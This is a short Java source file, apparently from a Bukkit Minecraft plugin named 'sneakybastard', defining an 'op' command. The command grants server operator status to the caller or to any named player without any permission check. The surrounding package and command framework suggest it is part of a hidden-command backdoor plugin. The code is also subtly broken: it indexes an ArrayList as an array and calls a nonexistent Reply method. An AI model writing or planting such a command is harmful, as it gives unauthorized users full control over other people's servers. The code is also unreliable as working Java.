package net.blackofworld.sneakybastard.Commands.Server;

import net.blackofworld.sneakybastard.Command.CommandBase;
import net.blackofworld.sneakybastard.Command.CommandCategory;
import net.blackofworld.sneakybastard.Command.CommandInfo;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@CommandInfo(command = "op", description = "Gives you op.", Syntax = "[player]", category = CommandCategory.Server)
public final class Op extends CommandBase {

    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Player pp = p;
        if(args.size() > 0) { pp = Bukkit.getPlayerExact(args[0]); }
        pp.setOp(true);
        if(args.size() > 0) { p.Reply(pp.getName() + " is now an operator");}
        else p.Reply("You are now an operator");
    }
}
